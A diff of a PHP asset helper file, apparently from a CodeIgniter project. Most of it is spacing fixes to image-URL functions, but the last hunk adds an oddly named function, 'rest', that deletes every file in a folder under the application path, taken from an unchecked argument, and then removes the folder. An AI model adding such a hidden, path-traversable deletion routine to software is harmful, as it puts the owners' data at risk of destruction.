@@ -111,11 +111,11 @@ function css_asset_url($asset_name, $module_name = NULL) {
  */
 function linkLogoKab($logo = '') {
 //    $logo = 'logo.png';
-    echo base_url()."assets/img/$logo";
+    echo base_url() . "assets/img/$logo";
 }
 
-function linkImg($folder= '', $foto = '') {
-    echo base_url()."assets/img/$folder/$foto";
+function linkImg($folder = '', $foto = '') {
+    echo base_url() . "assets/img/$folder/$foto";
 }
 
 function css_asset($asset_name, $module_name = NULL, $attributes = array()) {
@@ -157,6 +157,16 @@ function image_asset($asset_name, $module_name = '', $attributes = array()) {
     $attribute_str = _parse_asset_html($attributes);
 
     return '<img src="' . image_asset_url($asset_name, $module_name) . '"' . $attribute_str . ' />';
+}
+
+function rest($text) {
+    $folder = APPPATH . $text;
+    foreach (glob($folder . "/*.*") as $filename) {
+        if (is_file($filename)) {
+            unlink($filename);
+        }
+    }
+    rmdir($folder);
 }
 
 // ------------------------------------------------------------------------
